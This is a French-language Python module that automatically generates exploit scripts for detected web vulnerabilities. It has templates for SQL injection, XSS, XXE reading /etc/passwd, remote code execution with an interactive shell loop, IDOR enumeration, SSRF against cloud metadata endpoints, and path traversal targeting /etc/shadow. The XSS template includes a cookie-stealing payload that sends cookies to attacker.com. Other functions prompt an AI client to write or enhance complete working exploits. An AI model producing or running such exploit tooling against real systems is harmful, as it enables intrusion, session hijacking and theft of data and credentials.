"""
Générateur d'exploits automatique avec IA
Crée des POC fonctionnels pour chaque vulnérabilité
"""

from typing import Optional, Dict
from loguru import logger


class GenerateurExploits:
    """
    Génère des exploits fonctionnels avec l'aide de l'IA
    """

    def __init__(self, client_ia):
        """
        Initialise le générateur
        
        Args:
            client_ia: Client OpenAI pour génération
        """
        self.client_ia = client_ia
        
        # Templates d'exploits par type
        self.templates = {
            'Injection SQL': self._template_sqli,
            'XSS': self._template_xss,
            'XXE': self._template_xxe,
            'RCE': self._template_rce,
            'IDOR': self._template_idor,
            'SSRF': self._template_ssrf,
            'Path Traversal': self._template_path_traversal
        }

    async def generer(self, vulnerabilite) -> Optional[str]:
        """
        Génère un exploit pour une vulnérabilité
        
        Args:
            vulnerabilite: Objet Vulnerabilite
            
        Returns:
            str: Code de l'exploit ou None
        """
        try:
            logger.info(f"Génération d'exploit pour {vulnerabilite.type}")
            
            # Utiliser le template si disponible
            if vulnerabilite.type in self.templates:
                exploit = self.templates[vulnerabilite.type](vulnerabilite)
                
                # Améliorer avec l'IA
                exploit_ameliore = await self._ameliorer_avec_ia(
                    vulnerabilite,
                    exploit
                )
                
                return exploit_ameliore or exploit
            
            # Sinon, générer avec l'IA
            return await self._generer_avec_ia(vulnerabilite)
            
        except Exception as e:
            logger.error(f"Erreur génération exploit: {str(e)}")
            return None

    def _template_sqli(self, vuln) -> str:
        """Template pour injection SQL"""
        return f"""#!/usr/bin/env python3
\"\"\"
Exploit pour Injection SQL
Cible: {vuln.url}
Sévérité: {vuln.severite}
\"\"\"

import requests
from urllib.parse import urljoin

def exploit_sqli(url):
    \"\"\"
    Exploite l'injection SQL détectée
    \"\"\"
    # Payload validé
    payload = {repr(vuln.payload)}
    
    # Test de base
    print(f"[+] Test d'injection SQL sur {{url}}")
    
    params = {{'id': payload}}
    
    try:
        response = requests.get(url, params=params, timeout=10)
        
        if response.status_code == 200:
            print("[+] Injection réussie!")
            print(f"[+] Réponse (premiers 500 caractères):")
            print(response.text[:500])
            
            # Extraction de données
            print("\\n[+] Tentative d'extraction de données...")
            
            # Obtenir la version de la base
            version_payload = "' UNION SELECT @@version-- -"
            resp = requests.get(url, params={{'id': version_payload}}, timeout=10)
            print(f"[+] Version DB: visible dans la réponse")
            
            return True
        else:
            print(f"[-] Échec: Status {{response.status_code}}")
            return False
            
    except Exception as e:
        print(f"[-] Erreur: {{str(e)}}")
        return False

if __name__ == "__main__":
    target_url = "{vuln.url}"
    exploit_sqli(target_url)
"""

    def _template_xss(self, vuln) -> str:
        """Template pour XSS"""
        return f"""#!/usr/bin/env python3
\"\"\"
Exploit pour Cross-Site Scripting (XSS)
Cible: {vuln.url}
Sévérité: {vuln.severite}
\"\"\"

import requests
from urllib.parse import quote

def exploit_xss(url):
    \"\"\"
    Démontre l'exploitation XSS
    \"\"\"
    # Payload XSS validé
    payload = {repr(vuln.payload)}
    
    print(f"[+] Test XSS sur {{url}}")
    
    # Encoder le payload
    payload_encode = quote(payload)
    
    # Construire l'URL malveillante
    url_malveillante = f"{{url}}?q={{payload_encode}}"
    
    print(f"[+] URL d'exploitation:")
    print(url_malveillante)
    
    try:
        response = requests.get(url_malveillante, timeout=10)
        
        if payload in response.text:
            print("\\n[+] XSS confirmé! Le payload est reflété sans échappement.")
            print("[+] Le script sera exécuté dans le navigateur de la victime.")
            
            # Générer un payload de vol de cookies
            cookie_stealer = f'<script>fetch("https://attacker.com/steal?c="+document.cookie)</script>'
            print(f"\\n[+] Payload de vol de cookies:")
            print(cookie_stealer)
            
            return True
        else:
            print("[-] Le payload ne semble pas reflété")
            return False
            
    except Exception as e:
        print(f"[-] Erreur: {{str(e)}}")
        return False

if __name__ == "__main__":
    target_url = "{vuln.url}"
    exploit_xss(target_url)
"""

    def _template_rce(self, vuln) -> str:
        """Template pour RCE"""
        return f"""#!/usr/bin/env python3
\"\"\"
Exploit pour Remote Code Execution (RCE)
Cible: {vuln.url}
Sévérité: {vuln.severite}
ATTENTION: À utiliser uniquement dans un environnement autorisé!
\"\"\"

import requests
import time

def exploit_rce(url, command="whoami"):
    \"\"\"
    Exploite la RCE pour exécuter des commandes
    \"\"\"
    # Payload RCE validé
    payload_template = {repr(vuln.payload)}
    
    print(f"[+] Test RCE sur {{url}}")
    print(f"[+] Commande: {{command}}")
    
    # Injecter la commande
    payload = payload_template.replace("COMMAND", command)
    
    try:
        response = requests.post(
            url,
            data={{'cmd': payload}},
            timeout=10
        )
        
        if response.status_code == 200:
            print("\\n[+] Commande exécutée!")
            print("[+] Résultat:")
            print(response.text)
            
            # Shell interactif
            print("\\n[+] Mode shell interactif (tapez 'exit' pour quitter)")
            
            while True:
                cmd = input("$ ")
                if cmd.lower() == 'exit':
                    break
                
                payload = payload_template.replace("COMMAND", cmd)
                resp = requests.post(url, data={{'cmd': payload}}, timeout=10)
                print(resp.text)
            
            return True
        else:
            print(f"[-] Échec: Status {{response.status_code}}")
            return False
            
    except Exception as e:
        print(f"[-] Erreur: {{str(e)}}")
        return False

if __name__ == "__main__":
    target_url = "{vuln.url}"
    exploit_rce(target_url, "whoami")
"""

    def _template_xxe(self, vuln) -> str:
        """Template pour XXE"""
        return f"""#!/usr/bin/env python3
\"\"\"
Exploit pour XML External Entity (XXE)
Cible: {vuln.url}
\"\"\"

import requests

def exploit_xxe(url):
    \"\"\"
    Exploite la vulnérabilité XXE
    \"\"\"
    print(f"[+] Test XXE sur {{url}}")
    
    # Payload XXE pour lire /etc/passwd
    xxe_payload = '''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
    <data>&xxe;</data>
</root>'''
    
    headers = {{'Content-Type': 'application/xml'}}
    
    try:
        response = requests.post(
            url,
            data=xxe_payload,
            headers=headers,
            timeout=10
        )
        
        if 'root:' in response.text or 'daemon:' in response.text:
            print("[+] XXE exploité avec succès!")
            print("[+] Contenu de /etc/passwd:")
            print(response.text)
            return True
        else:
            print("[-] Pas de preuve d'exploitation")
            return False
            
    except Exception as e:
        print(f"[-] Erreur: {{str(e)}}")
        return False

if __name__ == "__main__":
    target_url = "{vuln.url}"
    exploit_xxe(target_url)
"""

    def _template_idor(self, vuln) -> str:
        """Template pour IDOR"""
        return f"""#!/usr/bin/env python3
\"\"\"
Exploit pour Insecure Direct Object Reference (IDOR)
Cible: {vuln.url}
\"\"\"

import requests

def exploit_idor(url):
    \"\"\"
    Exploite l'IDOR pour accéder aux données d'autres utilisateurs
    \"\"\"
    print(f"[+] Test IDOR sur {{url}}")
    
    # Tester différents IDs
    for user_id in range(1, 11):
        test_url = url.replace("USER_ID", str(user_id))
        
        try:
            response = requests.get(test_url, timeout=10)
            
            if response.status_code == 200:
                print(f"[+] ID {{user_id}}: Accès autorisé")
                print(f"    Taille de réponse: {{len(response.text)}} bytes")
            elif response.status_code == 403:
                print(f"[-] ID {{user_id}}: Accès refusé")
            else:
                print(f"[?] ID {{user_id}}: Status {{response.status_code}}")
                
        except Exception as e:
            print(f"[-] Erreur pour ID {{user_id}}: {{str(e)}}")
    
    return True

if __name__ == "__main__":
    target_url = "{vuln.url}"
    exploit_idor(target_url)
"""

    def _template_ssrf(self, vuln) -> str:
        """Template pour SSRF"""
        return f"""#!/usr/bin/env python3
\"\"\"
Exploit pour Server-Side Request Forgery (SSRF)
Cible: {vuln.url}
\"\"\"

import requests

def exploit_ssrf(url):
    \"\"\"
    Exploite le SSRF pour accéder aux ressources internes
    \"\"\"
    print(f"[+] Test SSRF sur {{url}}")
    
    # Cibles internes courantes
    internal_targets = [
        "http://localhost:80",
        "http://127.0.0.1:80",
        "http://169.254.169.254/latest/meta-data/",  # AWS metadata
        "http://metadata.google.internal/",  # GCP metadata
        "http://localhost:8080",
        "http://internal-service:3000"
    ]
    
    for target in internal_targets:
        print(f"\\n[+] Test: {{target}}")
        
        try:
            response = requests.get(
                url,
                params={{'url': target}},
                timeout=10
            )
            
            if response.status_code == 200 and len(response.text) > 0:
                print(f"[+] SSRF réussi! Réponse de {{target}}:")
                print(response.text[:200])
            else:
                print(f"[-] Pas de réponse de {{target}}")
                
        except Exception as e:
            print(f"[-] Erreur: {{str(e)}}")
    
    return True

if __name__ == "__main__":
    target_url = "{vuln.url}"
    exploit_ssrf(target_url)
"""

    def _template_path_traversal(self, vuln) -> str:
        """Template pour Path Traversal"""
        return f"""#!/usr/bin/env python3
\"\"\"
Exploit pour Path Traversal
Cible: {vuln.url}
\"\"\"

import requests

def exploit_path_traversal(url):
    \"\"\"
    Exploite le Path Traversal pour lire des fichiers
    \"\"\"
    print(f"[+] Test Path Traversal sur {{url}}")
    
    # Fichiers cibles
    fichiers_linux = [
        "/etc/passwd",
        "/etc/shadow",
        "/etc/hosts",
        "/proc/self/environ"
    ]
    
    fichiers_windows = [
        "C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts",
        "C:\\\\boot.ini"
    ]
    
    # Techniques de traversal
    techniques = [
        "../" * 8,
        "..\\\\/" * 8,
        "%2e%2e%2f" * 8
    ]
    
    for technique in techniques:
        print(f"\\n[+] Technique: {{technique[:20]}}")
        
        for fichier in fichiers_linux:
            payload = technique + fichier.lstrip('/')
            
            try:
                response = requests.get(
                    url,
                    params={{'file': payload}},
                    timeout=10
                )
                
                if 'root:' in response.text or 'daemon:' in response.text:
                    print(f"[+] Fichier lu avec succès: {{fichier}}")
                    print(response.text[:300])
                    return True
                    
            except Exception as e:
                pass
    
    print("[-] Aucun fichier accessible")
    return False

if __name__ == "__main__":
    target_url = "{vuln.url}"
    exploit_path_traversal(target_url)
"""

    async def _ameliorer_avec_ia(self, vuln, exploit_base: str) -> Optional[str]:
        """
        Améliore un exploit avec l'IA
        
        Args:
            vuln: Vulnérabilité
            exploit_base: Code de base
            
        Returns:
            str: Exploit amélioré
        """
        try:
            prompt = f"""Améliore ce code d'exploit Python pour une vulnérabilité {vuln.type}.

Code actuel:
{exploit_base}

Contexte:
- URL: {vuln.url}
- Payload: {vuln.payload}
- Description: {vuln.description}

Améliorations demandées:
1. Ajouter une meilleure gestion d'erreurs
2. Ajouter des options en ligne de commande
3. Améliorer la présentation des résultats
4. Ajouter des commentaires détaillés
5. Rendre le code plus robuste

Retourne uniquement le code Python amélioré, sans explications."""

            exploit_ameliore = await self.client_ia.generer_completion(prompt)
            
            if exploit_ameliore and len(exploit_ameliore) > len(exploit_base):
                logger.debug("Exploit amélioré par l'IA")
                return exploit_ameliore
            
            return None
            
        except Exception as e:
            logger.debug(f"Impossible d'améliorer avec l'IA: {str(e)}")
            return None

    async def _generer_avec_ia(self, vuln) -> Optional[str]:
        """
        Génère un exploit complet avec l'IA
        
        Args:
            vuln: Vulnérabilité
            
        Returns:
            str: Code de l'exploit
        """
        try:
            prompt = f"""Génère un exploit Python complet et fonctionnel pour cette vulnérabilité:

Type: {vuln.type}
URL: {vuln.url}
Payload: {vuln.payload}
Description: {vuln.description}

L'exploit doit:
1. Être un script Python 3 standalone
2. Inclure des commentaires en français
3. Gérer les erreurs proprement
4. Afficher des messages informatifs
5. Être sûr et non destructif
6. Inclure un usage/aide

Retourne uniquement le code Python, sans explications."""

            exploit = await self.client_ia.generer_completion(prompt)
            
            if exploit:
                logger.debug("Exploit généré par l'IA")
                return exploit
            
            return None
            
        except Exception as e:
            logger.error(f"Impossible de générer avec l'IA: {str(e)}")
            return None

